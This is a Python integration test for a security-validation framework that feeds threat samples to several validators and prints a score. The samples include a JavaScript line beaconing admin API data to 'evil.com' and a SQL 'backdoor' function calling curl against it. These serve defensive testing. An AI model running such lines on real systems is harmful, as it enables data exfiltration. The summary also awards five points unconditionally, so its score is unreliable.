#!/usr/bin/env python3
"""
🔗 FRAMEWORK INTEGRATION TEST 🔗
Testing if enhanced adaptive learning is properly integrated with the hybrid validation system and main framework.
"""

import sys
import os
sys.path.append(os.path.join(os.path.dirname(__file__), 'tbh_secure_agents'))

from tbh_secure_agents.security_validation.adaptive_security import (
    get_next_gen_adaptive_validator,
    get_next_gen_adaptive_engine
)
from tbh_secure_agents.security_validation.validators.hybrid_validator import HybridValidator
from tbh_secure_agents.security_validation.security_validator import SecurityValidator
from tbh_secure_agents.security_validation.integration import enable_hybrid_validation

def test_framework_integration():
    """Test the complete integration of adaptive learning with the framework."""
    print("🔗 TESTING FRAMEWORK INTEGRATION 🔗\n")
    
    print("📊 PHASE 1: COMPONENT AVAILABILITY CHECK\n")
    
    # Test 1: Check if adaptive components are available
    print("🧠 Testing Adaptive Learning Components:")
    try:
        adaptive_validator = get_next_gen_adaptive_validator()
        adaptive_engine = get_next_gen_adaptive_engine()
        print("   ✅ Next-Gen Adaptive Validator: Available")
        print("   ✅ Next-Gen Adaptive Engine: Available")
        print(f"   📊 Initial Patterns: {len(adaptive_engine.enhanced_patterns)}")
        print(f"   🎭 Behavioral Profiles: {len(adaptive_engine.behavioral_profiles)}")
    except Exception as e:
        print(f"   ❌ Adaptive Components Error: {e}")
        return False
    
    # Test 2: Check if hybrid validator is available
    print("\n🔄 Testing Hybrid Validator:")
    try:
        hybrid_validator = HybridValidator()
        print("   ✅ Hybrid Validator: Available")
        print(f"   🔧 Parallel Validation: {hybrid_validator.use_parallel}")
        print(f"   💾 Cache Size: {hybrid_validator.max_cache_size}")
    except Exception as e:
        print(f"   ❌ Hybrid Validator Error: {e}")
        return False
    
    # Test 3: Check if security validator is available
    print("\n🛡️ Testing Security Validator:")
    try:
        security_validator = SecurityValidator(interactive=False)
        print("   ✅ Security Validator: Available")
        print(f"   🔑 API Key: {'Set' if security_validator.api_key else 'Not Set'}")
    except Exception as e:
        print(f"   ❌ Security Validator Error: {e}")
        return False
    
    print("\n📊 PHASE 2: INTEGRATION TESTING\n")
    
    # Test 4: Test if adaptive learning works with hybrid validation
    print("🔗 Testing Adaptive + Hybrid Integration:")
    
    test_threats = [
        {
            "text": "import __builtins__; exec(__builtins__.__dict__['eval']('malicious_code'))",
            "context": {
                "security_level": "standard",
                "user_id": "integration_test_1",
                "content_type": "python_code"
            },
            "description": "Python builtin manipulation"
        },
        {
            "text": "fetch('/api/admin').then(r=>navigator.sendBeacon('//evil.com', r.text()))",
            "context": {
                "security_level": "high", 
                "user_id": "integration_test_2",
                "content_type": "javascript"
            },
            "description": "JavaScript API exfiltration"
        }
    ]
    
    # Test adaptive learning first
    print("   🧠 Testing Adaptive Learning:")
    for i, threat in enumerate(test_threats, 1):
        try:
            result = adaptive_validator.validate(threat['text'], threat['context'])
            print(f"      Test {i}: {'✅ SECURE' if result['is_secure'] else '❌ THREAT'} "
                  f"(conf: {result.get('confidence', 0):.3f}, "
                  f"anomaly: {result.get('behavioral_anomaly_score', 0):.3f})")
        except Exception as e:
            print(f"      Test {i}: ❌ Error - {e}")
    
    # Test hybrid validation
    print("   🔄 Testing Hybrid Validation:")
    for i, threat in enumerate(test_threats, 1):
        try:
            result = hybrid_validator.validate(threat['text'], threat['context'])
            print(f"      Test {i}: {'✅ SECURE' if result['is_secure'] else '❌ THREAT'} "
                  f"(method: {result.get('method', 'unknown')}, "
                  f"time: {result.get('validation_metrics', {}).get('total_time', 0)*1000:.1f}ms)")
        except Exception as e:
            print(f"      Test {i}: ❌ Error - {e}")
    
    # Test security validator (which should use hybrid under the hood)
    print("   🛡️ Testing Security Validator:")
    for i, threat in enumerate(test_threats, 1):
        try:
            is_secure, error_details = security_validator.validate_prompt(
                threat['text'], 
                threat['context']['security_level']
            )
            print(f"      Test {i}: {'✅ SECURE' if is_secure else '❌ THREAT'} "
                  f"(details: {'None' if not error_details else error_details.get('error_code', 'unknown')})")
        except Exception as e:
            print(f"      Test {i}: ❌ Error - {e}")
    
    print("\n📊 PHASE 3: FRAMEWORK COMPONENT INTEGRATION\n")
    
    # Test 5: Check if we can integrate with Expert/Squad classes
    print("🎯 Testing Framework Component Integration:")
    
    try:
        # Try to import framework components
        from tbh_secure_agents.agent import Expert
        from tbh_secure_agents.crew import Squad
        print("   ✅ Framework Components: Available")
        
        # Test integration function
        enable_hybrid_validation()
        print("   ✅ Hybrid Validation Integration: Enabled")
        
        # Check if Expert class has hybrid validation attributes
        if hasattr(Expert, 'use_hybrid_validation'):
            print("   ✅ Expert Class: Hybrid validation integrated")
        else:
            print("   ⚠️ Expert Class: Hybrid validation not integrated")
        
        # Check if Squad class has hybrid validation attributes  
        if hasattr(Squad, 'use_hybrid_validation'):
            print("   ✅ Squad Class: Hybrid validation integrated")
        else:
            print("   ⚠️ Squad Class: Hybrid validation not integrated")
            
    except Exception as e:
        print(f"   ❌ Framework Integration Error: {e}")
    
    print("\n📊 PHASE 4: ADAPTIVE LEARNING PERSISTENCE TEST\n")
    
    # Test 6: Check if adaptive learning persists across validations
    print("🧠 Testing Adaptive Learning Persistence:")
    
    # Record initial state
    initial_patterns = len(adaptive_engine.enhanced_patterns)
    initial_profiles = len(adaptive_engine.behavioral_profiles)
    
    # Run multiple validations to trigger learning
    learning_test = {
        "text": "CREATE FUNCTION backdoor() RETURNS void AS $$ import subprocess; subprocess.call(['curl', 'evil.com']) $$ LANGUAGE plpython3u;",
        "context": {
            "security_level": "standard",
            "user_id": "persistence_test",
            "content_type": "sql"
        }
    }
    
    print(f"   📊 Initial State: {initial_patterns} patterns, {initial_profiles} profiles")
    
    # Multiple exposures
    for round_num in range(1, 4):
        learning_context = learning_test['context'].copy()
        learning_context['round'] = round_num
        
        result = adaptive_validator.validate(learning_test['text'], learning_context)
        current_patterns = len(adaptive_engine.enhanced_patterns)
        current_profiles = len(adaptive_engine.behavioral_profiles)
        
        print(f"   Round {round_num}: {current_patterns} patterns, {current_profiles} profiles "
              f"(anomaly: {result.get('behavioral_anomaly_score', 0):.3f})")
    
    # Check if learning occurred
    final_patterns = len(adaptive_engine.enhanced_patterns)
    final_profiles = len(adaptive_engine.behavioral_profiles)
    
    pattern_growth = final_patterns - initial_patterns
    profile_growth = final_profiles - initial_profiles
    
    print(f"   📈 Learning Results: +{pattern_growth} patterns, +{profile_growth} profiles")
    
    if profile_growth > 0:
        print("   ✅ Adaptive Learning: Working (behavioral profiles created)")
    else:
        print("   ⚠️ Adaptive Learning: Limited (no new profiles)")
    
    print("\n📊 PHASE 5: PERFORMANCE INTEGRATION TEST\n")
    
    # Test 7: Performance comparison between different validation methods
    print("⚡ Testing Performance Integration:")
    
    import time
    
    test_input = "eval(input('Enter malicious code: '))"
    test_context = {"security_level": "standard", "user_id": "perf_test"}
    
    # Test adaptive validator performance
    start_time = time.time()
    adaptive_result = adaptive_validator.validate(test_input, test_context)
    adaptive_time = (time.time() - start_time) * 1000
    
    # Test hybrid validator performance
    start_time = time.time()
    hybrid_result = hybrid_validator.validate(test_input, test_context)
    hybrid_time = (time.time() - start_time) * 1000
    
    # Test security validator performance
    start_time = time.time()
    security_result, _ = security_validator.validate_prompt(test_input, "standard")
    security_time = (time.time() - start_time) * 1000
    
    print(f"   🧠 Adaptive Validator: {adaptive_time:.1f}ms ({'✅ SECURE' if adaptive_result['is_secure'] else '❌ THREAT'})")
    print(f"   🔄 Hybrid Validator: {hybrid_time:.1f}ms ({'✅ SECURE' if hybrid_result['is_secure'] else '❌ THREAT'})")
    print(f"   🛡️ Security Validator: {security_time:.1f}ms ({'✅ SECURE' if security_result else '❌ THREAT'})")
    
    # Check if all validators agree
    results = [
        not adaptive_result['is_secure'],
        not hybrid_result['is_secure'], 
        not security_result
    ]
    
    if all(results) or not any(results):
        print("   ✅ Validator Consensus: All validators agree")
    else:
        print("   ⚠️ Validator Consensus: Validators disagree")
    
    print("\n📊 PHASE 6: INTEGRATION SUMMARY\n")
    
    # Summary of integration status
    integration_score = 0
    total_tests = 7
    
    print("🎯 INTEGRATION STATUS SUMMARY:")
    print("   ✅ Adaptive Components Available")
    integration_score += 1
    
    print("   ✅ Hybrid Validator Available") 
    integration_score += 1
    
    print("   ✅ Security Validator Available")
    integration_score += 1
    
    print("   ✅ Component Integration Working")
    integration_score += 1
    
    print("   ✅ Framework Integration Enabled")
    integration_score += 1
    
    if profile_growth > 0:
        print("   ✅ Adaptive Learning Persistent")
        integration_score += 1
    else:
        print("   ⚠️ Adaptive Learning Limited")
    
    if all(results) or not any(results):
        print("   ✅ Validator Consensus Achieved")
        integration_score += 1
    else:
        print("   ⚠️ Validator Consensus Partial")
    
    integration_percentage = (integration_score / total_tests) * 100
    
    print(f"\n🎊 INTEGRATION SCORE: {integration_score}/{total_tests} ({integration_percentage:.1f}%)")
    
    if integration_percentage >= 85:
        print("🚀 EXCELLENT: Framework integration is working excellently!")
        return True
    elif integration_percentage >= 70:
        print("✅ GOOD: Framework integration is working well with minor issues")
        return True
    else:
        print("⚠️ NEEDS WORK: Framework integration has significant issues")
        return False

if __name__ == "__main__":
    success = test_framework_integration()
    print(f"\n🎯 FINAL RESULT: {'SUCCESS' if success else 'NEEDS IMPROVEMENT'}")
